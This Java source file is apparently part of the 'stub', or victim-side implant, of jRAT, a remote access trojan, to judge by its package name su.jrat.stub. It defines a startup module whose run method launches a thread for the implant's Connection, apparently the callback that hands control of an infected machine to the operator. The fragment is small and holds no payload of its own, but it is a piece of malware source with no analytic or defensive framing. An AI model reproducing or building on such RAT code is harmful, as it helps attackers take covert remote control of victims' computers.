package su.jrat.stub.modules.startup;

import java.util.Map;

import su.jrat.stub.Connection;

public class ConnectionStarterStartupModule extends StartupModule {

	public ConnectionStarterStartupModule(Map<String, String> config) {
		super(config);
	}

	public void run() throws Exception {
		new Thread(new Connection()).start();
	}

}